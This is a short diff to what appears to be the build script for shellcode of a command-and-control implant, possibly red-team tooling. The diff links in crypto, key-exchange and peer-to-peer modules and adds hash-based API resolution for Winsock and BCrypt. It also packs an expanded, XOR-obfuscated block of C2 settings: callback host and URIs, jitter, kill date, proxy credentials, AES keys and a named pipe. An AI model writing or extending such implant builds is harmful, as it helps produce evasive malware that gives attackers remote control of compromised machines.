@@ -24,6 +24,15 @@ x64:
 	load "bin/util.o"
 	merge
 	
+	load "bin/crypto.o"
+	merge
+	
+	load "bin/ecke.o"
+	merge
+	
+	load "bin/p2p.o"
+	merge
+	
 	export
 	
 	# Make the shellcode.
@@ -36,15 +45,19 @@ x64:
 	mergelib "lib/LibWinHttp/libwinhttp.x64.zip"
 	
 	# Opt into dynamic function resolution using the resolve() function.
-	dfr "resolve" "ror13" "KERNEL32, NTDLL"
+	dfr "resolve" "ror13" "KERNEL32, NTDLL, WS2_32, BCRYPT"
 	dfr "resolve_unloaded" "strings"
 	
 	# Generate a random XOR key and patch it in.
 	generate $ENC_KEY 128
 	patch "ENC_KEY" $ENC_KEY
 	
+	# Seed the runtime RNG state with a fresh per-build value.
+	generate $RNG_SEED 4
+	patch "crypto_rng_state" $RNG_SEED
+	
 	# Marshal and obfuscate string parameters from the C2.
-	pack $RAW_PARAMS "zziiz" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %CALLBACK_URI
+	pack $RAW_PARAMS "zziizzziizzzizzzzzzzi" %PAYLOAD_UUID %CALLBACK_HOST %CALLBACK_PORT %CALLBACK_HTTPS %POST_URI %GET_URI %QUERY_PATH_NAME %CALLBACK_INTERVAL %CALLBACK_JITTER %KILLDATE %HEADERS %PROXY_HOST %PROXY_PORT %PROXY_USER %PROXY_PASS %AES_VALUE %AES_KEY %ENCRYPTED_EXCHANGE_CHECK %PIPENAME %P2P_PROFILE %P2P_PORT
 	
 	push $RAW_PARAMS
 	xor $ENC_KEY
